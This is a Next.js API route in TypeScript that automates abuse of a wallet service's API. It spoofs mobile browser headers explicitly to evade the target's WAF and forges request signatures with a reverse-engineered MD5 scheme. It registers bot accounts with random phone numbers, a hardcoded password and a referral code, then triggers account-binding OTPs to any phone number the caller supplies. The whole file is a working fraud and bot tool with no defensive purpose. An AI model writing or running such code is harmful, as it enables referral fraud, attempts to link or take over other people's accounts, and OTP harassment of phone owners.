import crypto from 'crypto';
import { NextResponse } from 'next/server';

/**
 * Standardized CORS Headers for Cross-Origin compatibility.
 */
const CORS_HEADERS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS, DELETE, PUT',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization, Accept, X-Requested-With, token, Signature, Origin, Referer, Sec-Ch-Ua, Sec-Ch-Ua-Mobile, Sec-Ch-Ua-Platform',
  'Access-Control-Max-Age': '86400',
};

/**
 * ADVANCED STEALTH HEADERS: Comprehensive mobile browser fingerprinting.
 * Spoofs a legitimate Android Chrome client to bypass WAF/CORS filters.
 */
const STEALTH_HEADERS = {
  "Accept": "application/json, text/plain, */*",
  "Accept-Language": "en-US,en;q=0.9",
  "Content-Type": "application/json;charset=UTF-8",
  "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
  "Origin": "https://api.rswallet-api.com",
  "Referer": "https://api.rswallet-api.com/",
  "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
  "Sec-Ch-Ua-Mobile": "?1",
  "Sec-Ch-Ua-Platform": '"Android"',
  "Sec-Fetch-Dest": "empty",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Site": "same-origin",
  "Priority": "u=1, i"
};

/**
 * Senior Cryptographic Signature Engine.
 */
function generateSignature(dataDict: Record<string, any>, sessionKey: string = "") {
  const sortedKeys = Object.keys(dataDict).sort();
  let rawStr = "";
  for (const key of sortedKeys) {
    rawStr += `${key}${dataDict[key]}`;
  }
  rawStr += sessionKey;
  return crypto.createHash('md5').update(rawStr).digest('hex');
}

/**
 * Asynchronous Throttling Helper.
 */
const sleep = (ms: number) => new Promise(res => setTimeout(res, ms));

const TARGET_BASE_URL = "https://api.rswallet-api.com";

/**
 * Safe Fetch Helper to prevent JSON parsing crashes.
 */
async function safeFetch(url: string, options: any) {
  try {
    const res = await fetch(url, options);
    const rawText = await res.text();
    
    console.log(`[UPSTREAM] URL: ${url} | STATUS: ${res.status}`);

    if (!rawText || rawText.startsWith('<') || rawText.includes("Invalid CORS request") || rawText.includes("Forbidden")) {
      return { 
        code: res.status, 
        message: "Target Server Security Block detected", 
        raw: rawText.substring(0, 200) || "Empty response"
      };
    }

    try {
      return JSON.parse(rawText);
    } catch (e) {
      return { code: res.status, message: "Invalid JSON from upstream", raw: rawText.substring(0, 200) };
    }
  } catch (err: any) {
    return { code: 500, message: "Connection Failure", error: err.message };
  }
}

export async function OPTIONS() {
  return new NextResponse(null, {
    status: 204,
    headers: CORS_HEADERS,
  });
}

export async function POST(request: Request) {
  const logs: any[] = [];
  
  try {
    const body = await request.json().catch(() => ({}));
    const targetPhone = body.phone;
    const accountType = body.accountType || "1";

    if (!targetPhone) {
      return NextResponse.json({ 
        code: 400, 
        message: "Identification Required: Phone number missing.", 
        logs: [] 
      }, { status: 200, headers: CORS_HEADERS });
    }

    // Step 0: Bot Profile Generation
    const botPhone = ["6", "7", "8", "9"][Math.floor(Math.random() * 4)] + 
                     Array.from({ length: 9 }, () => Math.floor(Math.random() * 10)).join('');
    
    const password = "Ritik@123";
    const pinCode = "954073";
    const referralCode = "0ealuckpayvp";

    // 1. Bot Registration
    await sleep(2000);
    const regJson = await safeFetch(`${TARGET_BASE_URL}/app/auth/register`, {
      method: 'POST',
      headers: STEALTH_HEADERS,
      body: JSON.stringify({ phone: botPhone, password, referralCode })
    });
    logs.push({ "Step 1: Bot Registration": regJson });

    if (regJson.code !== 200) {
      return NextResponse.json({ 
        code: 400, 
        message: regJson.message || "Gateway rejection during registration", 
        logs 
      }, { status: 200, headers: CORS_HEADERS });
    }

    // 2. Bot Login
    await sleep(2000);
    const loginJson = await safeFetch(`${TARGET_BASE_URL}/app/auth/login`, {
      method: 'POST',
      headers: STEALTH_HEADERS,
      body: JSON.stringify({ phone: botPhone, password })
    });
    logs.push({ "Step 2: Bot Login": loginJson });

    if (loginJson.code !== 200) {
      return NextResponse.json({ code: 400, message: "Auth Sequence Failed: Login rejected", logs }, { status: 200, headers: CORS_HEADERS });
    }

    const { userId, loginToken: token, sessionKey } = loginJson.data || {};
    if (!token) {
      return NextResponse.json({ code: 400, message: "Identity Linkage Error: Token missing", logs }, { status: 200, headers: CORS_HEADERS });
    }

    const authHeaders: Record<string, string> = {
      ...STEALTH_HEADERS,
      "Authorization": token,
      "token": token
    };

    // 3. Pin Bind
    await sleep(2000);
    let ts = Date.now();
    let pinPayload = { pinCode, ts, userId };
    authHeaders["Signature"] = generateSignature(pinPayload, sessionKey);
    const bindJson = await safeFetch(`${TARGET_BASE_URL}/app/secure/pin/bind`, {
      method: 'POST',
      headers: authHeaders,
      body: JSON.stringify(pinPayload)
    });
    logs.push({ "Step 3: Secure Pin Bind": bindJson });

    // 4. Pin Verify
    await sleep(2000);
    ts = Date.now();
    pinPayload = { pinCode, ts, userId };
    authHeaders["Signature"] = generateSignature(pinPayload, sessionKey);
    const verifyJson = await safeFetch(`${TARGET_BASE_URL}/app/secure/pin/verify`, {
      method: 'POST',
      headers: authHeaders,
      body: JSON.stringify(pinPayload)
    });
    logs.push({ "Step 4: PIN Verification": verifyJson });

    // 5. Pre Check Integrity
    await sleep(2000);
    ts = Date.now();
    const prePayload = { mobile: targetPhone, type: 13, appPinCode: pinCode, ts, userId };
    authHeaders["Signature"] = generateSignature(prePayload, sessionKey);
    const preJson = await safeFetch(`${TARGET_BASE_URL}/app/bind/pre/check`, {
      method: 'POST',
      headers: authHeaders,
      body: JSON.stringify(prePayload)
    });
    logs.push({ "Step 5: Pre-Dispatch Check": preJson });

    // 6. OTP Dispatch to Target
    await sleep(2000);
    ts = Date.now();
    const otpPayload = { mobile: targetPhone, type: 13, accountType: String(accountType), ts, userId };
    authHeaders["Signature"] = generateSignature(otpPayload, sessionKey);
    const otpJson = await safeFetch(`${TARGET_BASE_URL}/app/bind/send/otp`, {
      method: 'POST',
      headers: authHeaders,
      body: JSON.stringify(otpPayload)
    });
    logs.push({ "Step 6: OTP Action Trigger": otpJson });

    return NextResponse.json({ 
      code: 200, 
      message: "Orchestration successfully processed.", 
      logs 
    }, { status: 200, headers: CORS_HEADERS });

  } catch (err: any) {
    console.error('[CRITICAL FLOW ERROR]:', err);
    return NextResponse.json({ 
      code: 500, 
      message: `System Integrity Fault: ${err.message}`, 
      logs: logs 
    }, { status: 200, headers: CORS_HEADERS });
  }
}
